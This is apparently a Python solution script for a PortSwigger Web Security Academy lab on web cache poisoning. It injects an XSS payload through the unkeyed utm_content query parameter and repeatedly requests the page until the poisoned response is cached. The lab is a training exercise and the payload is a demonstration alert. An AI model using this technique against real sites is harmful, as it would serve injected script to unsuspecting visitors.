"""
Lab 6: Web cache poisoning via an unkeyed query parameter
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param
Difficulty: Practitioner

📝 Narrower than Lab 5 — most of the query string IS keyed, but one
specific param (classically a UTM analytics param like utm_content) is
excluded from the key while still being reflected.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
UNKEYED_PARAM = "utm_content"
XSS_PAYLOAD = "'/><script>alert(1)</script>"


def run():
    s = get_session()

    note("Confirming the rest of the query string IS keyed (changing it")
    note("alone should give a cache MISS) while utm_content is not.")
    r1 = s.get(f"{TARGET}/?cb=1")
    r2 = s.get(f"{TARGET}/?cb=2")
    log(f"Different cb -> X-Cache differs: {cache_status(r1) != cache_status(r2)}")

    note(f"Confirming {UNKEYED_PARAM} doesn't affect the key — add it with a")
    note("cache-buster present, confirm cache miss, then confirm later hits")
    note("ignore its value.")

    poison_until_hit(s, f"{TARGET}/?cb=12345&{UNKEYED_PARAM}={XSS_PAYLOAD}")

    note("Re-poison the REAL URL without the cache-buster.")
    r = poison_until_hit(s, f"{TARGET}/?{UNKEYED_PARAM}={XSS_PAYLOAD}")
    if r:
        log(f"Payload reflected: {'alert(1)' in r.text}")


if __name__ == "__main__":
    run()
